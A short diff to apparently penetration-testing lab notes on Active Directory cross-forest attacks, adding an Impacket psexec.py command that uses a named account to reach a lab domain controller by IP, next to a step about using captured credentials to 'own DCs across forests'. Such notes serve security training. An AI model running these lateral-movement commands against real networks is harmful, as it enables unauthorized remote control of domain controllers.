@@ -248,3 +248,6 @@ From Linux, cross-forest game plan:
 6. Use resulting creds with Impacket tools (`psexec.py`, `wmiexec.py`, `smbexec.py`) to own DCs across forests.
 
 
+```c
+psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238
+```
